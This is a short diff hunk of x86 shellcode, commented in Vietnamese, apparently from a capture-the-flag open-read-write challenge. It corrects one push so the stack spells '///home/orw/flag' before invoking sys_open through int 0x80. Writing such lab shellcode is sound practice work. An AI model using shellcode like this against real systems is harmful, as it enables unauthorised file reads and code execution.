@@ -9,7 +9,7 @@ code:
 	push 0x67616c66   // push chuỗi direction của file vào stack
 	push 0x2f77726f   //..
 	push 0x2f656d6f   //..
-	push 0x682f2ff    //..
+	push 0x682f2f2f   //..
 	mov ebx,esp       // đưa chuỗi direction vào thanh ghi ebx
 	mov al,0x05	  // syscall của sys_open là 0x5
 	int 0x80          // gọi interupt
